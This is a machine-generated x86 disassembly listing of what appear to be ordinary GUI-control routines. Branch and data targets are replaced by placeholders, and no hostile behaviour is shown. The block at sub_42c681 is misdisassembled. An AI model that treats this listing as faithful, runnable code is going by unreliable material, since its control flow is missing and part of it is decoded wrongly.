or [ eax + 0x88 ] 0x2
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42bf6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ ebp - 0x4 ]
or [ eax + 0x88 ] 0x4
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42bfa8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ ebp - 0x4 ]
or [ eax + 0x88 ] 0x8
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42bfe4
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x1c ]
mov ecx 0x4
[ edi ] [ esi ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x44 ] 0x400
xor eax eax
push ebp
push sub_42c117
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov bx 0xffe6
call sub_44c24c
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
cmp [ eax + 0x140 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c11e
mov eax [ ebp - 0x4 ]
and [ eax + 0x44 ] 0xfbff
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x140 ]
mov edx [ ebp - 0x4 ]
call sub_43c728
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x90 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x90 ] edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x140 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov bx 0xffc3
call sub_44c24c
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov bx 0xffcc
call sub_44c24c
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x140 ]
mov edx [ ebp - 0x4 ]
call sub_43c264
sub_42c128
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
xor ecx ecx
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x47 ]
mov eax [ ebp - 0x4 ]
call sub_42d084
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_42c1e4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_42e014
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
sub_42c198
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x30 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x3c ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
pop ecx
pop ecx
pop ebp
retn
sub_42c1e4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42c224
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x38 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x3c ]
mov [ eax + 0xc ] edx
pop ecx
pop ecx
pop ebp
retn
sub_42c25c
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_42c280
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42c2b0
mov edx eax
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_43b77c
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42c778
mov esp ebp
pop ebp
retn
sub_42c2b0
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_42c2d4
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42c25c
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_43b77c
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42c778
mov esp ebp
pop ebp
retn
sub_42c304
push ebp
mov ebp esp
add esp 0xffffffec
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c39b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x30 ]
add [ eax ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x34 ]
add [ eax + 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c3a2
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a48
call sub_44c7a8
sub_42c3a8
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
add eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
add eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_42c3e4
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
sub eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ edx + 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_42c420
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_41fac4
sub_42c468
push ebp
mov ebp esp
add esp 0xffffffe8
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
and ax [ edx + 0x20 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx 0xb042
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
call sub_42df28
sub_42c4e0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x88 ] dl
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
je r-xdata
mov al [ r-xdata ]
mov [ ebp - 0x1d ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1d ] al
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MulDiv
mov [ ebp - 0x10 ] eax
jmp r-xdata
test [ ebp - 0x1d ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call MulDiv
mov [ ebp - 0x14 ] eax
jmp r-xdata
test [ ebp - 0x1d ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x1
jne r-xdata
test [ ebp - 0x1d ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x41 ] 0x2
jne r-xdata
test [ ebp - 0x1d ] 0x1
je r-xdata
test [ ebp - 0x1d ] 0x10
je r-xdata
test [ ebp - 0x1d ] 0x8
je r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
push eax
call MulDiv
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x38 ]
push eax
call MulDiv
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40ecd4
push eax
call MulDiv
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40ed00
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call MulDiv
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
add eax [ edx + 0x3c ]
push eax
call MulDiv
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
test [ ebp - 0x1d ] 0x8
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
jne r-xdata
sub_42c681
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff8
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4c ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov bx 0xffef
call sub_44c24c
sub_42c6bc
push ebp
mov ebp esp
add esp 0xfffffff0
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c76d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x40 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x20 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] al
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442930
cmp [ ebp - 0x9 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_42c9ec
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_44ce70
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c774
lea eax [ ebp - 0x10 ]
call sub_44cae0
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42ca2c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test [ eax + 0x20 ] 0x1
je r-xdata
sub_42c778
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
sub eax [ ebp - 0x14 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
sub eax [ ebp - 0x10 ]
add eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x7c ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c7cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
call sub_43074c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43065c
mov eax [ ebp - 0x4 ]
call sub_42bdc0
sub_42c838
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x47 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov bx 0xffd2
call sub_44c24c
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x47 ] al
push 0x0
xor ecx ecx
mov cl [ ebp - 0x5 ]
mov edx 0xb00b
mov eax [ ebp - 0x4 ]
call sub_42df28
mov eax [ ebp - 0x4 ]
mov bx 0xffd5
call sub_44c24c
sub_42c88c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x48 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x48 ] al
push 0x0
xor ecx ecx
mov edx 0xb00c
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42c8c4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
push 0x0
xor ecx ecx
mov edx 0xe
mov eax [ ebp - 0x4 ]
call sub_42df28
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42c8e8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx 0xd
mov eax [ ebp - 0x4 ]
call sub_42df28
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_42c918
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x98 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x98 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42c94c
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42c980
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6c ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_40bbc8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44222c
sub_42c9b8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
push eax
xor ecx ecx
mov edx 0xc
mov eax [ ebp - 0x4 ]
call sub_42df28
push 0x0
xor ecx ecx
mov edx 0xb012
mov eax [ ebp - 0x4 ]
call sub_42df28
pop ecx
pop ecx
pop ebp
retn
sub_42c9ec
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42c8c4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_44cbc8
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
inc ecx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_42c8e8
sub_42ca2c
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ca8b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_42c9ec
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_44ce70
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ca92
lea eax [ ebp - 0xc ]
call sub_44cae0
retn
mov eax [ ebp - 0x8 ]
call sub_44cf24
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42c9b8
sub_42ca98
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x4f ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4f ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x50 ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb03c
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42cad4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x46 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40ec04
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x74 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb00e
mov eax [ ebp - 0x4 ]
call sub_42df28
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x88 ] 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_40ec04
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
sub_42cb34
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop ecx
pop ecx
pop ebp
retn
sub_42cb54
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x46 ] 0x0
je r-xdata
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
mov al 0x1
sub_42cb80
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x8a ]
xor al 0x1
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42cba0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x50 ]
xor al 0x1
mov [ ebp - 0x5 ] al
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_42cbbc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x49 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x49 ] al
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24 ] 0x0
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42cbfc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x89 ]
cmp al [ ebp - 0x5 ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov al [ ebp - 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x89 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8a ] 0x0
push 0x0
xor ecx ecx
mov edx 0xb022
mov eax [ ebp - 0x4 ]
call sub_42df28
sub_42cc44
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x5 ] dl
